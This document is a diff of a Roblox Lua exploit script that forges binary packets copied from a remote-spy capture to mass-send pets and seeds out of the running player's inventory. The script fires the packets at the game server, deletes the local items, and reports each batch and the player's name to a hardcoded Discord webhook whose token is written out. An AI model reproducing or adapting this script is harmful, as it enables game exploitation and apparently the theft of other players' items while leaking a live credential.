@@ -1,17 +1,15 @@
--- Generated Payload Sender
-local PETS = {"Unicorn","Bald Eagle","Monkey","Owl","Frog","Golden Dragonfly","Bunny","Bee","Turtle","Black Dragon","Ice Serpent","Bear","Butterfly","Firefly","Raccoon","Deer","Robin"}
+-- Generated Dual Mass Payload Sender
+local ALLOWED_PETS = {"Robin"}
+local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Mango","Cactus","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
 
-local ALLOWED = {}
-for _, p in ipairs(PETS) do table.insert(ALLOWED, string.lower(p)) end
+local petLookup = {}
+for _, p in ipairs(ALLOWED_PETS) do petLookup[string.lower(p)] = true end
 
-local function buildPacket(petId)
-    -- This keeps EVERY single byte identical to Cobalt's signature, only swapping the UUID dynamically
-    local s = "!\x01\x18\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01\x1C\v\aItemKey\v$" .. petId .. "\v\x05Count\x05\x01\v\bCategory\v\x04Pets\x00\x00\x00"
-    return buffer.fromstring(s)
-end
+local seedLookup = {}
+for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[string.lower(s)] = true end
 
 local function sendWebhook(msg)
     local req = (type(request) == "function" and request) 
@@ -30,45 +28,86 @@ end
 
 local player = game:GetService("Players").LocalPlayer
 local backpack = player:WaitForChild("Backpack")
-local totalFired = 0
 
-sendWebhook("🚀 Script started by **" .. player.Name .. "**")
+sendWebhook("🚀 **Dual Mass Script Started** by " .. player.Name)
 
-while totalFired < 100 do
-    local items = backpack:GetChildren()
-    local anyProcessed = false
+-- Recursive builder matching the strict Cobalt schema layout
+local function appendPayload(currentBuffer, index, itemKey, count, category)
+    local keyHeader = string.format("\x1C\v\aItemKey\v%s", itemKey)
+    local countSec = string.format("\v\x05Count\x05%s", string.char(count))
+    local catSec = string.format("\v\bCategory\v%s", string.char(#category) .. category)
     
+    local divider = (index == 1) and "" or string.format("\x00\x05%s", string.char(index))
+    return currentBuffer .. divider .. keyHeader .. countSec .. catSec
+end
+
+-- Core Execution Queue loop
+while true do
+    local items = backpack:GetChildren()
+    local selectedQueue = {}
+
+    -- Scan for target matching inventory
     for _, item in ipairs(items) do
-        local petId = item:GetAttribute("PetId")
-        local petName = item:GetAttribute("Pet")
+        if #selectedQueue >= 20 then break end
         
-        if petId and petName then
-            local lowerName = string.lower(petName)
-            local isAllowed = false
-            
-            for _, allowed in ipairs(ALLOWED) do
-                if lowerName == allowed then
-                    isAllowed = true
-                    break
-                end
+        local isSeed = item:GetAttribute("MainCategory") == "Seed"
+        if isSeed then
+            local seedName = item:GetAttribute("SeedTool")
+            local count = item:GetAttribute("Count") or 1
+            if seedName and seedLookup[string.lower(seedName)] then
+                table.insert(selectedQueue, {
+                    ItemInstance = item,
+                    Key = string.char(#seedName) .. seedName,
+                    Count = count,
+                    Category = "Seeds"
+                })
             end
-            
-            if isAllowed then
-                if Event then 
-                    Event:FireServer(buildPacket(petId)) 
-                end
-                totalFired = totalFired + 1
-                anyProcessed = true
-                sendWebhook("**Pet Sent**\nName: `" .. petName .. "`\nID: `" .. petId .. "`")
-                item:Destroy()
-                task.wait(10)
+        else
+            local petName = item:GetAttribute("Pet")
+            local petId = item:GetAttribute("PetId")
+            if petName and petId and petLookup[string.lower(petName)] then
+                table.insert(selectedQueue, {
+                    ItemInstance = item,
+                    Key = "$" .. petId,
+                    Count = 1,
+                    Category = "Pets"
+                })
             end
         end
     end
-    
-    if not anyProcessed then 
-        task.wait(1) 
-    end
-end
 
-sendWebhook("✅ Script finished. Fired " .. totalFired .. " packets.")
+    if #selectedQueue == 0 then
+        sendWebhook("🏁 **Inventory Cleared** – No remaining selected items in backpack.")
+        break
+    end
+
+    -- Dynamically generate the Cobalt-compliant buffer byte structure
+    local dynamicPayload = ""
+    for idx, itemData in ipairs(selectedQueue) do
+        dynamicPayload = appendPayload(dynamicPayload, idx, itemData.Key, itemData.Count, itemData.Category)
+    end
+    dynamicPayload = dynamicPayload .. "\x00\x00\x00"
+
+    -- Build correct Cobalt-header binary block prefix
+    local rawSize = #dynamicPayload + 12
+    local sizeByte = string.char(rawSize)
+    local header = "!\x01" .. sizeByte .. "\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+    local fullPayload = header .. dynamicPayload
+
+    -- Fire transaction
+    if Event then
+        Event:FireServer(buffer.fromstring(fullPayload))
+    end
+
+    -- Construct logs & cleanup
+    local logLines = {}
+    for _, itemData in ipairs(selectedQueue) do
+        table.insert(logLines, string.format("• %s (x%d) sent.", itemData.ItemInstance.Name, itemData.Count))
+        itemData.ItemInstance:Destroy()
+    end
+    
+    sendWebhook("⚡ **Batch Fired (" .. #selectedQueue .. " items)**:\n" .. table.concat(logLines, "\n"))
+
+    -- Wait 10 seconds only if there are more remaining candidates
+    task.wait(10)
+end
